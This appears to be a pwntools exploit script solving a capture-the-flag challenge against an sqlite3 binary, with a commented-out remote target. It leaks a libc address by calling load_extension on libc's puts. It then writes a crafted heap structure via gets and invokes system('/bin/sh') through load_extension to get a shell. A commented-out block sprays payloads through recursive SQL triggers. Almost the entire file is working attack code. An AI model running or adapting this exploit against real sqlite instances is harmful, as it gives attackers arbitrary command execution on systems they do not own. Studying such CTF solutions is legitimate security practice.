from pwn import *

#p = remote('notabug2.nc.jctf.pro', 1337)
p = process(["./sqlite3","--interactive"])

fd = open(f'/proc/{p.pid}/maps')
maps = fd.read()
maps = maps.split('[heap]')[0].split('\n')[-1]
heap = int(maps[:12],16)
print(hex(heap))
raw_input()


p.sendline(b"select Load_extension('/lib/x86_64-linux-gnu/libc.so.6','puts');")
lic = u64(p.recvuntil([b'\x55',b'\x56',b'\x54',b'\x57'])[-6:].ljust(8,b'\x00'))

pie_base = lic - 0x1589a0
system_plt = (pie_base+0x2228C)
heap1 = 0x1590 + heap

print(hex(pie_base)) #lic+0x28b8

p.sendline(b"select Load_extension('/lib/x86_64-linux-gnu/libc.so.6','gets');")
p.sendline(p64(heap1-0x48+0x10)+b'a'*0x8+p64(pie_base+0x000000000009e0ad))

p.sendline(b"select Load_extension('"+p64(system_plt)[:6]+b"','/bin/sh');")

#0x973d0

'''
for i in range(100):
    payload = ('''create table if not exists test{}(val1 string, dummy integer, dummy1 string, dummy3 integer, looper integer);
    create trigger test{}_ins_trigger after insert on test{}
    when new.looper < 1252921504606847975 begin
        insert into test{}(val1, dummy, dummy1, dummy3, looper) values(new.val1, new.dummy, new.dummy1, new.dummy3, new.looper + 1);
    end;
    pragma recursive_triggers = 1;
    insert into test{}(val1, dummy, dummy1, dummy3, looper) values(\'{}\', {}, \''''.format(i, i, i, i, i, "/bin/s", ord("h")<<8).encode()) + b"ZAFIRRRR" + b"A"*0x38 + p64(system_plt)[:-3] + '''\', {}, 1252921504606846976);'''.format((system_plt>>40)<<16).encode()
    p.sendlineafter("sqlite>", payload)
'''